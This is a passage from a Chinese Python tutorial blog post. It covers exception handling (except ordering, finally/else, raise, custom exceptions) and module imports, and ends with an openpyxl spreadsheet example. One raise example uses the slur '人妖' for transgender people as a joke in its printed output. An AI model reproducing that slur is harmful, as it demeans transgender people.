zero</span><br></pre></td></tr></table></figure><ul><li>如果程序发生的异常不在你的捕获列表中，那么依然会抛出别的异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 未捕获到异常，程序直接报错</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">int</span>(s1)</span><br><span class="line"><span class="keyword">except</span> IndexError <span class="keyword">as</span> ex:    <span class="comment"># 本例为非法值异常，而你只捕获索引异常</span></span><br><span class="line">    <span class="built_in">print</span>(ex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;F:/Python/pycharm/201705/1.py&quot;</span>, line <span class="number">5</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">int</span>(s1)</span><br><span class="line">ValueError: invalid literal <span class="keyword">for</span> <span class="built_in">int</span>() <span class="keyword">with</span> base <span class="number">10</span>: <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>如果一个异常没有与任何的except匹配，那么这个异常将会传递给上层的try中。也就是前面说的嵌套处理能力。直到程序最顶端如果还没有被捕获，那么将弹出异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发生异常之前的语句正常执行&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发生异常之后的语句不会被执行&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;里层没有抓好，只能辛苦我外层了&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>可能包含多个except子句，分别来处理不同的特定的异常。但最多只有一个分支会被执行。所以except子句有排序先后问题，进了一条巷子就不会进别的巷子。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之前的语句正常执行&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;发生异常之后的语句不会被执行&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> NameError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是第一个抓取到除零异常的&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> (ValueError,ZeroDivisionError) <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是备胎&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------</span></span><br><span class="line">发生异常之前的语句正常执行</span><br><span class="line">我是第一个抓取到除零异常的</span><br></pre></td></tr></table></figure><ul><li>处理程序将只针对对应的try子句中的异常进行处理，不会处理其他try语句中的异常。</li><li>一个except子句可以同时处理多个异常，这些异常将被放在一个括号里成为一个元组。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span> (RuntimeError, TypeError, NameError):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><ul><li>最后一个except子句可以忽略异常的名称，它将被当作通配符使用，也就是说匹配所有异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Unexpected error:&quot;</span>, sys.exc_info()[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>看一个综合性的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;myfile.txt&#x27;</span>)</span><br><span class="line">    s = f.readline()</span><br><span class="line">    i = <span class="built_in">int</span>(s.strip())</span><br><span class="line"><span class="keyword">except</span> OSError <span class="keyword">as</span> err:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;OS error: &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(err))</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Could not convert data to an integer.&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Unexpected error:&quot;</span>, sys.exc_info()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p><strong>通用异常：Exception</strong></p><p>在Python的异常中，有一个通用异常：<code>Exception</code>，它可以捕获任意异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">int</span>(s1)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;错误&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么既然有这个什么都能管的异常，其他诸如OSError、ValueError的异常是不是就可以不需要了？当然不是！很多时候程序只会弹出那么几个异常，没有必要针对所有的异常进行捕获，那样的效率会很低。另外，根据不同的异常种类，制定不同的处理措施，用于准确判断错误类型，存储错误日志，都是非常有必要甚至强制的。</p><h3 id="finally和else子句">finally和else子句</h3><p><code>try except</code>语法还有一个可选的else子句，如果使用这个子句，那么必须放在所有的except子句之后。这个子句将在try子句没有发生任何异常的时候执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = <span class="built_in">open</span>(arg, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cannot open&#x27;</span>, arg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(arg, <span class="string">&#x27;has&#x27;</span>, <span class="built_in">len</span>(f.readlines()), <span class="string">&#x27;lines&#x27;</span>)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>同样的，还有一个可选的finally子句。无论try执行情况和except异常触发情况，finally子句都会被执行！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;try...&#x27;</span>)</span><br><span class="line">    r = <span class="number">10</span> / <span class="built_in">int</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>, r)</span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ValueError:&#x27;</span>, e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finally...&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;END&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么，当else和finally同时存在时：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;else&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finally&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">finally</span></span><br></pre></td></tr></table></figure><p>如果有异常发生：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;else&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finally&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">finally</span></span><br></pre></td></tr></table></figure><h3 id="主动抛出异常：raise">主动抛出异常：raise</h3><p>很多时候，我们需要主动抛出一个异常。Python内置了一个关键字<code>raise</code>，可以主动触发异常。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">raise</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">raise</span></span><br><span class="line">RuntimeError: No active exception to reraise</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">raise</span> NameError(<span class="string">&quot;kkk&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#1&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">raise</span> NameError(<span class="string">&quot;kkk&quot;</span>)</span><br><span class="line">NameError: kkk</span><br></pre></td></tr></table></figure><p>raise唯一的一个参数指定了要被抛出的异常的实例，如果什么参数都不给，那么会默认抛出当前异常。</p><p>可能有同学会问，为什么要自己主动抛出异常？不嫌多事么？因为有的时候，你需要记录错误信息，然后将异常继续往上层传递，让上层去处理异常，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span>/<span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;记录异常日志： &quot;</span>, ex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;但是我自己无法处理，只能继续抛出，看看上层能否处理（甩锅）&quot;</span>)</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>有时候，你需要主动弹出异常，作为警告或特殊处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sex = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input a number: &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> sex == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是个男人！&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> sex == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这是个女人！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;好像有什么不符合常理的事情发生了！！&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法的输入&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> ValueError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这是个人妖！&quot;</span>)</span><br></pre></td></tr></table></figure><p>更多的时候，你需要使用raise抛出你自定义的异常，如下面所述!</p><h3 id="自定义异常">自定义异常</h3><p>Python内置了很多的异常类，并且这些类都是从BaseException类派生的。</p><p>下面是一些常见异常类，请把它们记下来！这样你在见到大多数异常的时候都能快速准确的判断异常类型。</p><table><thead><tr><th>异常名</th><th>解释</th></tr></thead><tbody><tr><td>AttributeError</td><td>试图访问一个对象没有的属性</td></tr><tr><td>IOError</td><td>输入/输出异常</td></tr><tr><td>ImportError</td><td>无法引入模块或包；多是路径问题或名称错误</td></tr><tr><td>IndentationError</td><td>缩进错误</td></tr><tr><td>IndexError</td><td>下标索引错误</td></tr><tr><td>KeyError</td><td>试图访问不存在的键</td></tr><tr><td>KeyboardInterrupt</td><td>Ctrl+C被按下，键盘终止输入</td></tr><tr><td>NameError</td><td>使用未定义的变量</td></tr><tr><td>SyntaxError</td><td>语法错误</td></tr><tr><td>TypeError</td><td>传入对象的类型与要求的不符合</td></tr><tr><td>UnboundLocalError</td><td>试图访问一个还未被设置的局部变量</td></tr><tr><td>ValueError</td><td>传入一个调用者不期望的值，即使值的类型是正确的</td></tr><tr><td>OSError</td><td>操作系统执行错误</td></tr></tbody></table><p>大多数情况下，上面的内置异常已经够用了，但是有时候你还是需要自定义一些异常。自定义异常应该继承<code>Exception</code>类，直接继承或者间接继承都可以，例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyExcept</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, msg</span>):</span><br><span class="line">        self.message = msg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.message</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">raise</span> MyExcept(<span class="string">&#x27;我的异常!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> MyExcept <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(ex)　</span><br></pre></td></tr></table></figure><p>异常的名字都以<code>Error</code>结尾，我们在为自定义异常命名的时候也需要遵守这一规范，就跟标准的异常命名一样。</p><h3 id="模块与包">模块与包</h3><p>在编程语言中，代码块、函数、类、模块，一直到包，逐级封装，层层调用。**在Python中，一个<code>.py</code>文件就是一个模块，模块是比类更高一级的封装。**在其他语言，被导入的模块也通常称为库。</p><p><strong>模块可以分为自定义模块、内置模块和第三方模块</strong>。自定义模块就是你自己编写的模块，如果你自认水平很高，也可以申请成为Python内置的标准模块之一！如果你在网上发布自己的模块并允许他人使用，那么就变成了第三方模块。内置模块是Python“内置电池”哲学的体现，在安装包里就提供了跨平台的一系列常用库，涉及方方面面。第三方模块的数量非常庞大，有许多非常有名并且影响广泛的模块，比如Django。</p><p>使用模块有什么好处？</p><ul><li>首先，提高了代码的可维护性。</li><li>其次，编写代码不必从零开始。当一个模块编写完毕，就可以被其他的模块引用。不要重复造轮子，我们简简单单地使用已经有的模块就好了。</li><li>使用模块还可以避免类名、函数名和变量名发生冲突。相同名字的类、函数和变量完全可以分别存在不同的模块中。但是也要注意尽量不要与内置函数名（类名）冲突。</li></ul><p><strong>为了避免模块名冲突，Python又引入了按目录来组织模块的方法，称为包（Package），包是模块的集合，比模块又高一级的封装</strong>。没有比包更高级别的封装，但是包可以嵌套包，就像文件目录一样</p><p><strong>包名通常为全部小写，避免使用下划线。</strong></p><hr><p>要在我们的程序中，使用其它的模块（包、类、函数），就必须先导入对应的模块（包、类、函数）。在Python中，模块（包、类、函数）的导入方式有以下四种：</p><ul><li><code>import xx.xx</code></li><li><code>from xx.xx import xx</code></li><li><code>from xx.xx import xx as rename</code></li><li><code>from xx.xx import *</code></li></ul><p><strong>对于<code>xx.xx</code>的说明：</strong></p><p>由于一个模块可能会被一个包封装起来，而一个包又可能会被另外一个更大的包封装起来，所以我们在导入的时候，需要提供导入对象的绝对路径，也就是<code>“最顶层的包名.次一级包名.（所有级别的包名）.模块名.类名.函数名”</code>。类似文件系统的路径名，只是用圆点分隔的。</p><p>有时候，模块名就在搜索路径根目录下，那么可以直接<code>import 模块名</code>，比如Python内置的一些标准模块，<code>os、sys、time</code>等等。</p><p>大多数时候，我们不需要直接导入到函数的级别，只需要导入到模块级别或者类的级别，就只需要使用<code>import Django.contrib.auth.models</code>导入models模块，以后使用<code>models.User</code>来引用models模块中的类。</p><p>总之，对于<code>xx.xx</code>，你想导入到哪个级别，取决于你的需要，可以灵活调整，没有固定的规则。</p><ol><li><code>import xx.xx</code></li></ol><p>这会将对象（这里的对象指的是包、模块、类或者函数，下同）中的所有内容导入。如果该对象是个模块，那么调用对象内的类、函数或变量时，需要以<code>module.xxx</code>的方式。</p><p>比如，被导入的模块<code>Module_a</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Module_a.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is module A!&quot;</span>) </span><br></pre></td></tr></table></figure><p>在<code>Main.py</code>中导入<code>Module_a</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> module_a</span><br><span class="line"></span><br><span class="line">module_a.func()  <span class="comment"># 调用方法</span></span><br></pre></td></tr></table></figure><ol start="2"><li><code>From xx.xx import xx.xx</code></li></ol><p>从某个对象内导入某个指定的部分到当前命名空间中，不会将整个对象导入。这种方式可以节省写长串导入路径的代码，但要小心名字冲突。</p><p>在<code>Main.py</code>中导入<code>Module_a</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> module_a <span class="keyword">import</span> func</span><br><span class="line"></span><br><span class="line">module_a.func()   <span class="comment"># 错误的调用方式</span></span><br><span class="line"></span><br><span class="line">func()  <span class="comment"># 这时需要直接调用func</span></span><br></pre></td></tr></table></figure><ol start="3"><li><code>from xx.xx import xx as rename</code></li></ol><p>为了避免命名冲突，在导入的时候，可以给导入的对象重命名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> module_a <span class="keyword">import</span> func <span class="keyword">as</span> f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(): <span class="comment">## main模块内部已经有了func函数</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is main module!&quot;</span>)</span><br><span class="line"></span><br><span class="line">func()</span><br><span class="line">f()</span><br></pre></td></tr></table></figure><ol start="4"><li><code>from xx.xx import *</code></li></ol><p>将对象内的所有内容全部导入。非常容易发生命名冲突，请慎用！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Main.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> module_a <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is main module!&quot;</span>)</span><br><span class="line"></span><br><span class="line">func()  <span class="comment"># 从module导入的func被main的func覆盖了</span></span><br></pre></td></tr></table></figure><p>执行结果：<code>this is main module!</code></p><p><strong>模块搜索路径</strong></p><p>不管你在程序中执行了多少次import，一个模块只会被导入一次。这样可以防止一遍又一遍地导入模块，节省内存和计算资源。那么，当使用import语句的时候，Python解释器是怎样找到对应的文件的呢？</p><p><strong>Python根据<code>sys.path</code>的设置，按顺序搜索模块。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line">[<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;C:\\Python36\\Lib\\idlelib&#x27;</span>, <span class="string">&#x27;C:\\Python36\\python36.zip&#x27;</span>, <span class="string">&#x27;C:\\Python36\\DLLs&#x27;</span>, <span class="string">&#x27;C:\\Python36\\lib&#x27;</span>, <span class="string">&#x27;C:\\Python36&#x27;</span>, <span class="string">&#x27;C:\\Python36\\lib\\site-packages&#x27;</span>]</span><br></pre></td></tr></table></figure><p>当然，这个设置是可以修改的，就像windows系统环境变量中的path一样，可以自定义。 通过<code>sys.path.append('路径')</code>的方法为<code>sys.path</code>路径列表添加你想要的路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">new_path = os.path.abspath(<span class="string">&#x27;../&#x27;</span>)</span><br><span class="line">sys.path.append(new_path)</span><br></pre></td></tr></table></figure><p>默认情况下，模块的搜索顺序是这样的：</p><ol><li>当前执行脚本所在目录</li><li>Python的安装目录</li><li>Python安装目录里的site-packages目录</li></ol><p>其实就是“自定义”——&gt;“内置”——&gt;“第三方”模块的查找顺序。任何一步查找到了，就会忽略后面的路径，所以模块的放置位置是有区别的。<br>总结：千万不要和内置模块或常用第三方模块同名！否则，哪怕你认为自己掌控着一切，也有可能会发生各种意想不到的结果！<br>只有包含<code>__init__.py</code>文件的目录才会被认作是一个包！<code>__init__.py</code>本身就是一个模块，但是要注意，它的模块名是它所在的包名而不是<code>__init__</code>。</p><p><em>一个使用第三方模块——openpyxl操作excel的小例子</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> Workbook, load_workbook</span><br><span class="line"></span><br><span class="line">wb1 = load_workbook(<span class="string">&quot;普通学生专业分流成绩-公示.xlsx&quot;</span>)</span><br><span class="line">wb2 = load_workbook(<span class="string">&quot;2022专业分流班级信息列表.xlsx&quot;</span>)</span><br><span class="line">wb3 = Workbook()</span><br><span class="line">sheet = wb3.active</span><br><span class="line">sheet1 = wb1[<span class="string">&quot;sheet1&quot;</span>]</span><br><span class="line">sheet2 = wb2[<span class="string">&quot;全部&quot;</span>]</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line">sheet.append([<span class="string">&quot;排名&quot;</span>, <span class="string">&quot;原排名&quot;</span>, <span class="string">&quot;姓名&quot;</span>, <span class="string">&quot;性别&quot;</span>, <span class="string">&quot;班号&quot;</span>])</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> sheet1.iter_rows(min_row=<span class="number">2</span>, max_row=<span class="number">458</span>, max_col=<span class="number">3</span>):</span><br><span class="line">    name = row[<span class="number">2</span>].value</span><br><span class="line">    <span class="keyword">for</span> row2 <span class="keyword">in</span> sheet2.iter_rows(min_row=<span class="number">356</span>, max_row=<span class="number">459</span>):</span><br><span class="line">        <span class="keyword">if</span> name == row2[<span class="number">2</span>].value:</span><br><span class="line">            sheet.append([count, row[<span class="number">0</span>].value, name, row2[<span class="number">3</span>].value, <span class="built_in">str</span>(row2[<span class="number">5</span>].value)[<span class="number">5</span>]])</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">wb3.save(<span class="string">&quot;2022级网安排名.xlsx&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>常用标准库</strong></p><p>Python奉行“内置电池”的哲学，内置了大量、全面、高效和跨平台的标准库，提供了非常丰富的功能，能够满足大多数常见的需求。并且很多都是用C语言编写的，执行速度也很快。</p><p>我们应该尽量多学习这些标准库，理解它们、掌握它们然后使用它们，避免重复造轮子，增强我们的开发能力，提高开发速度。</p><p>以下为常用的模块：</p><ul><li>os</li><li>sys</li><li>subprocess</li><li>random</li><li>bisect</li><li>hashlib</li><li>queue</li><li>fileinput</li><li>shutil</li><li>zipfile</li><li>tarfile</li><li>getpass</li><li>shelve</li><li>json</li><li>pickle</li><li>time</li><li>datetime</li><li>timeit</li><li>logging</li><li>re</li></ul><p>具体用法可查看<a href="https://www.liujiangblog.com/course/python/53">python常用标准库</a></p><p><strong>那么到此为止关于python（基础篇）的内容就将结束，当然还有很多方面没有涉猎，包括但不限于python与数据库的联合，多进程协程与异步，web开发与网络爬虫等等，碍于篇幅，今后填坑</strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
